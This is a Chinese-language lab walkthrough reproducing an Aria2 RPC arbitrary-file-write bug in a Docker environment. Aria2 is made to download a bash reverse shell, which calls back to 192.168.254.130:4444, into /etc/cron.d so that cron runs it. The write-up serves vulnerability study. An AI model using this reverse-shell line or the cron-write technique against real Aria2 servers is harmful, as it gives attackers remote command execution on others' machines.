# Aria2 任意文件写入漏洞

## 环境搭建

启动漏洞环境：

```plain
docker compose up -d
```

6800是aria2的rpc服务的默认端口，环境启动后，访问http://your-ip:6800/，发现服务已启动并且返回404页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844796-3fc37c57-0d87-4952-ba93-e4d266363698.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844814-ddb13f59-da04-4d9b-aede-90a75bb8264c.png)

## 漏洞复现

因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 [http://binux.github.io/yaaw/demo/](http://binux.github.io/yaaw/demo/#tdsub)。

在这之前，先写好反弹shell并用python搭建web服务

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844824-fb2d1a7d-ba98-4c3a-8d8a-9082071832c1.png)

shell文件，末尾需要一个换行符：

```plain
#!/bin/bash 
/bin/bash -i >& /dev/tcp/192.168.254.130/4444 0>&1
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844787-da9f11b5-83c7-44a1-85c7-a927d4d7ea83.png)

打开yaaw，点击配置按钮，填入运行aria2的目标域名：http://your-ip:6800/jsonrpc:

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844877-c08b5e0c-fdac-483f-9727-769775b487ce.png)

然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807845550-a7654050-3d81-46b9-b6f0-1fe907c2fd9c.png)

这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807845635-469906b9-2377-45e3-b8d7-6482c2c38718.png)

可以看到上传成功了。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807845939-524e72ef-a875-40e8-9284-21ce43dc135f.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807846112-d5944297-10f7-473b-9ee5-d7049ce94731.png)

如果反弹不成功，注意crontab文件的格式，以及换行符必须是\n，且文件结尾需要有一个换行符。

当然，我们也可以尝试写入其他文件，更多利用方法可以参考[这篇文章](https://paper.seebug.org/120/#tdsub)

# 